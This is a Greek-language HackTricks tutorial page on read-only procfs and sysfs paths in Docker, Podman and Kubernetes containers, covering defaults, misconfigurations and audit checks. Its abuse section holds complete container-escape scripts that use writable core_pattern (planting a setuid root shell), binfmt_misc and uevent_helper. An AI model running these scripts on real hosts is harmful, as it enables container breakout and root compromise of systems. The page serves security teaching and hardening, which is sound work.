# Διαδρομές Συστήματος Μόνο για Ανάγνωση

{{#include ../../../../banners/hacktricks-training.md}}

Οι διαδρομές συστήματος μόνο για ανάγνωση αποτελούν ξεχωριστό μέτρο προστασίας σε σχέση με τις masked paths. Αντί να αποκρύπτει μια διαδρομή πλήρως, το runtime την εκθέτει αλλά την προσαρτά ως μόνο για ανάγνωση. Αυτό είναι συνηθισμένο για επιλεγμένες τοποθεσίες procfs και sysfs όπου η ανάγνωση μπορεί να είναι αποδεκτή ή απαραίτητη για τη λειτουργία, ενώ οι εγγραφές θα ήταν πολύ επικίνδυνες.

Ο σκοπός είναι απλός: πολλά interfaces του kernel γίνονται πολύ πιο επικίνδυνα όταν είναι εγγράψιμα. Μια προσάρτηση μόνο για ανάγνωση δεν αφαιρεί όλη την αξία της αναγνώρισης, αλλά αποτρέπει ένα συμβιβασμένο φορτίο εργασίας από το να τροποποιήσει τα υποκείμενα αρχεία που αντιμετωπίζει ο kernel μέσω αυτής της διαδρομής.

## Λειτουργία

Τα runtimes συχνά επισημαίνουν μέρη της προβολής proc/sys ως μόνο για ανάγνωση. Ανάλογα με το runtime και το host, αυτό μπορεί να περιλαμβάνει διαδρομές όπως:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Η πραγματική λίστα ποικίλλει, αλλά το μοντέλο είναι το ίδιο: επιτρέπεται η ορατότητα όπου χρειάζεται, απορρίπτεται η τροποποίηση από προεπιλογή.

## Εργαστήριο

Επιθεώρησε τη λίστα διαδρομών μόνο για ανάγνωση που δηλώνει το Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Επιθεωρήστε την προσαρτημένη προβολή proc/sys από το εσωτερικό του container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Επιπτώσεις στην ασφάλεια

Οι διαδρομές συστήματος μόνο για ανάγνωση περιορίζουν μια μεγάλη κατηγορία καταχρήσεων που επηρεάζουν τον host. Ακόμη και όταν ένας επιτιθέμενος μπορεί να ελέγξει procfs ή sysfs, η αδυναμία εγγραφής εκεί αφαιρεί πολλούς άμεσους δρόμους τροποποίησης που αφορούν ρυθμιζόμενες παραμέτρους του πυρήνα, μηχανισμούς χειρισμού συντριβών, βοηθητικά για φόρτωση modules ή άλλες διεπαφές ελέγχου. Η έκθεση δεν εξαφανίζεται, αλλά η μετάβαση από αποκάλυψη πληροφορίας σε επιρροή του host γίνεται πιο δύσκολη.

## Λανθασίες ρυθμίσεις

Τα κύρια λάθη είναι το unmasking ή το remounting ευαίσθητων διαδρομών σε ανάγνωσης/εγγραφής, η έκθεση του host proc/sys περιεχομένου απευθείας με εγγράψιμους bind mounts, ή η χρήση λειτουργιών με προνόμια που στην πράξη παρακάμπτουν τα πιο ασφαλή runtime defaults. Στο Kubernetes, `procMount: Unmasked` και privileged workloads συχνά εμφανίζονται μαζί με ασθενέστερη προστασία του proc. Ένα άλλο κοινό λειτουργικό λάθος είναι η υπόθεση ότι επειδή το runtime συνήθως προσαρτά αυτές τις διαδρομές ως read-only, όλα τα workloads εξακολουθούν να κληρονομούν αυτή την προεπιλογή.

## Κατάχρηση

Αν η προστασία είναι αδύναμη, ξεκινήστε ψάχνοντας για εγγράψιμα στοιχεία στο proc/sys:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Όταν υπάρχουν εγγραφές με δυνατότητα εγγραφής, οι ακόλουθες διαδρομές υψηλής αξίας για συνέχιση περιλαμβάνονται:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Τι μπορούν να αποκαλύψουν αυτές οι εντολές:

- Οι εγγραφές με δυνατότητα εγγραφής κάτω από `/proc/sys` συχνά σημαίνουν ότι το container μπορεί να τροποποιήσει τη συμπεριφορά του host kernel αντί να την απλώς επιθεωρεί.
- `core_pattern` είναι ιδιαίτερα σημαντικό επειδή μια εγγράψιμη τιμή που κοιτάει το host μπορεί να μετατραπεί σε μονοπάτι εκτέλεσης κώδικα στο host με το να προκαλέσετε crash σε μια διεργασία αφού ορίσετε έναν pipe handler.
- `modprobe` αποκαλύπτει το helper που χρησιμοποιεί ο kernel για ροές φόρτωσης modules· είναι κλασικός στόχος υψηλής αξίας όταν είναι εγγράψιμο.
- `binfmt_misc` δείχνει αν είναι δυνατή η εγγραφή custom interpreter registration. Αν η εγγραφή είναι εγγράψιμη, αυτό μπορεί να γίνει execution primitive αντί απλώς ενός information leak.
- `panic_on_oom` ελέγχει μια απόφαση σε επίπεδο host του kernel και επομένως μπορεί να μετατρέψει resource exhaustion σε host denial of service.
- `uevent_helper` είναι ένα από τα πιο ξεκάθαρα παραδείγματα ενός εγγράψιμου sysfs helper path που παράγει εκτέλεση στο context του host.

Ενδιαφέροντα ευρήματα περιλαμβάνουν εγγράψιμους host-facing proc knobs ή sysfs entries που κανονικά θα έπρεπε να είναι μόνο για ανάγνωση. Σε εκείνο το σημείο, το workload έχει μετακινηθεί από μια περιορισμένη προβολή container προς σημαντική επιρροή στον kernel.

### Πλήρες Παράδειγμα: `core_pattern` Host Escape

Εάν `/proc/sys/kernel/core_pattern` είναι εγγράψιμο από μέσα στο container και δείχνει στην προβολή του host kernel, μπορεί να καταχρηστεί για να εκτελέσει ένα payload μετά από ένα crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Αν η διαδρομή φτάνει πραγματικά στον πυρήνα του host, το payload εκτελείται στον host και αφήνει πίσω ένα setuid shell.

### Πλήρες Παράδειγμα: `binfmt_misc` Εγγραφή

Αν το `/proc/sys/fs/binfmt_misc/register` είναι εγγράψιμο, μια προσαρμοσμένη εγγραφή interpreter μπορεί να παράγει code execution όταν το αντίστοιχο αρχείο εκτελείται:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Σε ένα host-facing εγγράψιμο `binfmt_misc`, το αποτέλεσμα είναι εκτέλεση κώδικα στο kernel-triggered interpreter path.

### Πλήρες Παράδειγμα: `uevent_helper`

Αν το `/sys/kernel/uevent_helper` είναι εγγράψιμο, ο kernel μπορεί να καλέσει έναν host-path helper όταν ενεργοποιείται ένα αντίστοιχο συμβάν:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Ο λόγος που αυτό είναι τόσο επικίνδυνο είναι ότι η διαδρομή του helper επιλύεται από την οπτική του filesystem του host αντί από ένα ασφαλές, μόνο-για-container πλαίσιο.

## Checks

Αυτοί οι έλεγχοι καθορίζουν κατά πόσο η έκθεση των procfs/sysfs είναι μόνο για ανάγνωση εκεί όπου αναμένεται και κατά πόσο το workload μπορεί ακόμα να τροποποιήσει ευαίσθητες διεπαφές του kernel.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Τι είναι ενδιαφέρον εδώ:

- Μια κανονική hardened workload θα πρέπει να εκθέτει πολύ λίγες εγγράψιμες καταχωρήσεις στο /proc/sys.
- Οι εγγράψιμες διαδρομές στο `/proc/sys` είναι συχνά πιο σημαντικές από την απλή πρόσβαση ανάγνωσης.
- Αν το runtime δηλώνει ότι μια διαδρομή είναι read-only αλλά στην πράξη είναι writable, ελέγξτε προσεκτικά το mount propagation, τα bind mounts και τις ρυθμίσεις privileges.

## Προεπιλογές runtime

| Runtime / πλατφόρμα | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνηθισμένη χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Docker Engine | Ενεργό από προεπιλογή | Το Docker ορίζει μια προεπιλεγμένη λίστα read-only διαδρομών για ευαίσθητες καταχωρήσεις proc | έκθεση host /proc/sys mounts, `--privileged` |
| Podman | Ενεργό από προεπιλογή | Το Podman εφαρμόζει προεπιλεγμένες read-only διαδρομές εκτός αν χαλαρώσουν ρητά | `--security-opt unmask=ALL`, ευρείες host mounts, `--privileged` |
| Kubernetes | Κληρονομεί τις προεπιλογές του runtime | Χρησιμοποιεί το υποκείμενο μοντέλο read-only διαδρομών του runtime εκτός αν αποδυναμωθεί από ρυθμίσεις Pod ή host mounts | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Προεπιλεγμένη κατάσταση runtime | Συνήθως βασίζεται σε OCI/runtime προεπιλογές | ίδιο με τη γραμμή Kubernetes; απευθείας αλλαγές στη ρύθμιση runtime μπορούν να αποδυναμώσουν τη συμπεριφορά |

Το βασικό σημείο είναι ότι οι read-only συστημικές διαδρομές συνήθως υπάρχουν ως προεπιλογή του runtime, αλλά είναι εύκολο να υπονομευτούν με privileged modes ή host bind mounts.
